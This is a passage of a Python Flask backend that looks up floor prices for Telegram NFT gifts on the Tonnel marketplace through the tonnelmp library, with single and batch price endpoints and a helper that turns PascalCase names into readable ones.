    """Конвертирует PascalCase в имя Tonnel: 'ToyBear' → 'Toy Bear', 'DurovsCap' → \"Durov's Cap\"."""
    import re as _re
    spaced = _re.sub(r'([a-z])([A-Z])', r'\1 \2', name)
    # Апостроф если согласная + 's' перед заглавной: 'Durovs Cap' → "Durov's Cap"
    spaced = _re.sub(r'([^aeiou\s])s ([A-Z])', r"\1's \2", spaced)
    return spaced


def _tonnel_fetch_floor_price(gift_name):
    """Получить минимальную цену подарка через tonnelmp (обходит Cloudflare через curl_cffi)."""
    import tonnelmp as _t
    readable_name = _pascal_to_tonnel_name(gift_name)
    items = _t.getGifts(gift_name=readable_name, sort='price_asc', limit=1)
    if items:
        price = items[0].get('price')
        if price is not None:
            return round(float(price), 4)
    return None


@app.route('/api/nft/price/<gift_name>', methods=['GET'])
def get_nft_price(gift_name):
    """Получить floor цену NFT подарка через Tonnel API"""
    try:
        price = _tonnel_fetch_floor_price(gift_name)
        if price is not None:
            return jsonify({'success': True, 'data': {'floor_price': price}})
        return jsonify({'success': False, 'error': 'price not found'}), 404
    except Exception as e:
        logger.error(f"Error getting NFT price for {gift_name}: {e}", exc_info=True)
        return jsonify({'success': False, 'error': str(e)}), 500


@app.route('/api/nft/prices/batch', methods=['POST'])
def get_nft_prices_batch():
    """Получить floor цены для нескольких NFT подарков через Tonnel API"""
    try:
        data = request.get_json() or {}
        gift_names = data.get('gift_names', [])
        if not gift_names:
            return jsonify({'success': False, 'error': 'gift_names required'}), 400

        from concurrent.futures import ThreadPoolExecutor, as_completed

        results = {}
        with ThreadPoolExecutor(max_workers=5) as ex:
            futures = {ex.submit(_tonnel_fetch_floor_price, n): n for n in gift_names[:20]}
            for fut in as_completed(futures, timeout=15):
                name = futures[fut]
                try:
                    price = fut.result()
                    if price is not None:
                        results[name] = price
                except Exception:
                    pass

        return jsonify({'success': True, 'data': results})
    except Exception as e:
        logger.error(f"Error in batch prices: {e}", exc_info=True)
        return jsonify({'success': False, 'error': str(e)}), 500


if __name__ == '__main__':
    Config.ensure_directories()
    app.run(debug=Config.FLASK_DEBUG, host=Config.FLASK_HOST, port=Config.FLASK_PORT)

